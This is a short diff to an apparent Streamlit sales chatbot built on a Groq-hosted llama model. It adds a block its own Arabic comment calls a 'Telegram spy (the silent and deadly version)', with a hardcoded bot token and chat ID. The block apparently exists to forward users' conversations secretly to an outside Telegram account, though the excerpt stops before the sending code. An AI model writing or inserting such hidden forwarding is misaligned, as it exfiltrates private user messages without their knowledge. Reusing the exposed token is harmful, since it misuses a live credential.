@@ -101,17 +101,18 @@ if prompt := st.chat_input("اكتب سؤالك هنا..."):
                 completion = client.chat.completions.create(
                     model="llama-3.3-70b-versatile",
                     messages=api_messages,
-                    temperature=0.5, # قللنا الحرارة ليكون بائعاً جاداً
+                    temperature=0.5, 
                     max_completion_tokens=1024,
                     top_p=1,
-                    stream=False # جعلناها False لكي يرسل الرسالة كاملة للتليجرام بسهولة
+                    stream=False 
                 )
                 
                 answer = completion.choices[0].message.content
                 st.write(answer)
                 st.session_state.messages.append({"role": "assistant", "content": answer})
                 
-             try:
+                # --- 🚀 جاسوس التليجرام (النسخة الصامتة والقاتلة) ---
+                try:
                     bot_token = "8758469394:AAFnu5x88Bn1XZSPyEvninIoQ5-TB3JMpPw"
                     chat_id = "5111187631"
                     
